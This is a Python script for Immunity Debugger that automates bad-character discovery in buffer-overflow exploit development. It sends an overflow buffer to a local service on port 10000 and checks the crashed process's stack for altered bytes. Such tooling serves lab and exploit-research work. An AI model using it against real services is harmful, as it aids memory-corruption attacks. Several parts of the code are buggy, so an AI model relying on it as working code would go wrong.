#!/usr/bin/env python
# _*_ coding: utf-8 -*-

import immlib
import os
import sys
from immlib import AccessViolationHook
from immlib import LogBpHook
import socket
import time


DESC="Automate the process to find bad char"


def get_allchar(bad_chars=[]):
   
	bad_chars_ord=[x for x in bad_chars]
	ret=""
	len=0
	for i in range(0,256):
		if i not in bad_chars_ord:
			len+=1
			ret+="%s"%chr(i)

	return [ret,len]

	
    
def send_buf(pre_payload_len,buffer_len,badchars=[]):
	imm=immlib.Debugger()
	imm.log("badchars %s"%(badchars))

	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect(("localhost",10000))

	payload,len_payload = get_allchar(badchars)
	
	imm.forgetKnowledge("payload")
	imm.forgetKnowledge("len_payload")
	
	imm.addKnowledge("payload", payload)
	imm.addKnowledge("len_payload", len_payload)

	
	
	buffer="A"*pre_payload_len
	buffer+="BBBB"
	buffer+=payload
	buffer+="C"*(buffer_len-len(buffer))
	
	
	sock.send(buffer)

	sock.close()


class AfterExceptionHook (AccessViolationHook):
    
	def __init__ (self):
		AccessViolationHook.__init__(self)

	def run(self,regs):
		imm=immlib.Debugger()
		EIP=regs['EIP']
		ESP=regs['ESP']
		imm.log("EIP : 0x%08x  Mem(ESP):0x%08x"%(EIP,imm.readLong(ESP)))
		
		
		payload=imm.getKnowledge("payload")
		len_payload=imm.getKnowledge("len_payload")
				
		mem= imm.readMemory(ESP, len_payload)
		
		mem_s=""
		mem_s_d=""
		for char in mem:
			mem_s_d+="\\x%02x"%ord(char)
	
		imm.log("Memory: %s %s"%(len_payload,mem_s_d))
		
		all_good=True
		bad_chars=imm.getKnowledge("badchars")
		candidate=None
		for char_i in range(len_payload):
			#imm.log("CHECK : \\x%02x \\x%02x"%(ord(payload[char_i]),ord(mem[char_i])))
			if mem[char_i]!=payload[char_i]:
				imm.log("Found BAD CHAR  : \\x%02x"%ord(candidate))
				if ord(payload[char_i]) not in bad_chars:
					imm.log("adding BAD CHAR  : \\x%02x"%ord(candidate))
					bad_chars.append(ord(candidate))
					imm.forgetKnowledge("badchars")
					imm.addKnowledge("badchars",bad_chars)
				all_good=False
				break
			
			candidate=payload[char_i]
		if all_good:
			imm.log("No new BAD CHAR found ")
		
		

def usage(args,imm):
	try:
		parsed = {}
		parsed['action']=args[0]
		if args[0] not in ['init','restart','attack']:
			return False
			
		if args[0]=="init":
			parsed['file']=args[1]
			parsed['buf_len']=int(args[2])
			parsed['payload_start']=int(args[3])
			
		imm.log("init usage-->")
		imm.log("%s"%parsed)
		imm.log("init usage--<")
		return parsed
			
	except:
		pass
	
	ret="usage: !badchars <param>\n"
	ret+="!badchars init path_to_file_to_debug  buffer_length payload_start\n"%args[0]
	ret+="!badchars restart \n"%args[0]
	ret+="!badchars attack \n"%args[0]
		
	
	return False
	
	
def main (args):
   
	imm = immlib.Debugger()
	
	
	parsed=usage(args,imm)
	if not parsed:
		return "[-] Sorry, command not recgnized"
	
	if parsed['action']=='init':
		filename=parsed['file']
		payload_start=parsed['payload_start']
		buf_len=parsed['buf_len']
		
		imm.log("opening executable %s"%filename)
		imm.log("%s"%imm.openProcess(filename,-2))
		
		data={"filename":filename,"payload_start":payload_start,"buf_len":buf_len}
		
		for key in imm.listKnowledge():
			imm.forgetKnowledge(key)
		
		imm.addKnowledge("data",data)
		imm.addKnowledge("badchars",[])
		
		imm.log("init-->")
		imm.log("%s"%imm.listKnowledge())
		imm.log("%s"%data)
		imm.log("%s"%[])
		imm.log("init--<")

		imm.log("%s"%imm.listKnowledge())
		return "[+] Init Complete"
	if parsed['action']=='restart':
		
		filename=imm.getKnowledge("filename")
		data=imm.getKnowledge("data")
		badchars=imm.getKnowledge("badchars")
		imm.log("restart-->")
		imm.log("%s"%imm.listKnowledge())
		imm.log("%s"%data)
		imm.log("%s"%badchars)
		imm.log("restart--<")
		
		imm.log("%s"%imm.restartProcess(-2))
		
		
		return "[+] Restart Complete"
	elif parsed['action']=='attack':
		#addrFunc=imm.getAddress('listen')
		#listenHook=BeforeEnterHook()
		#listenHook.add("Hooking strcpy",  addrFunc)
		imm.run()
		imm.run()
		afterExceptionHook=AfterExceptionHook()
		afterExceptionHook.add("AccessViolationHook")
		
		payload_start=imm.getKnowledge("payload_start")
		buf_len=imm.getKnowledge("buf_len")
		
		data=imm.getKnowledge("data")
		badchars=imm.getKnowledge("badchars")
		
		imm.log("before attack-->")
		imm.log("%s"%imm.listKnowledge())
		imm.log("%s"%data)
		imm.log("Bad Chars: %s"%','.join(["\\x%02x"%x for x in badchars]))
		imm.log("before attack--<")
		
		#140,500
		send_buf(data["payload_start"],data["buf_len"],badchars)
		
		data=imm.getKnowledge("data")
		badchars=imm.getKnowledge("badchars")
		
		imm.log("after attack-->")
		imm.log("%s"%imm.listKnowledge())
		imm.log("%s"%data)
		imm.log("Bad Chars: %s"%','.join(["\\x%02x"%x for x in badchars]))
		imm.log("after attack--<")
		
		return "[+] Attack Complete"

	return "[+] No Action, please choose an action"